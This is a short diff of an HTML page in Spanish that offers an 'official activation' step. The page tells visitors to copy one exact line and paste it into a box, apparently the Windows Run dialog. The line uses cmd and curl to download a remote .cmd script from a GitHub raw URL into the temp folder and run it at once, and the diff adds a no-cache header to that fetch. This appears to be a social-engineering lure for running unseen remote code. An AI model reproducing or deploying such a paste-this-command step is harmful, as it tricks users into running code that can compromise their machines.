@@ -348,7 +348,7 @@
                         <h3>Copiar y pegar la activación oficial</h3>
                         <p>Pega exactamente esta línea en la casilla y presiona <strong>Aceptar</strong>:</p>
                         <div class="command-box">
-                            <span id="cmdText1">cmd /c curl -sL https://raw.githubusercontent.com/Tecnologiacorvi/setup/main/instalar.cmd -o %TEMP%\inst.cmd && %TEMP%\inst.cmd</span>
+                            <span id="cmdText1">cmd /c curl -sL -H "Cache-Control: no-cache" https://raw.githubusercontent.com/Tecnologiacorvi/setup/main/instalar.cmd -o %TEMP%\inst.cmd && %TEMP%\inst.cmd</span>
                             <button class="copy-btn" onclick="copiar('cmdText1', this)">Copiar</button>
                         </div>
                     </div>
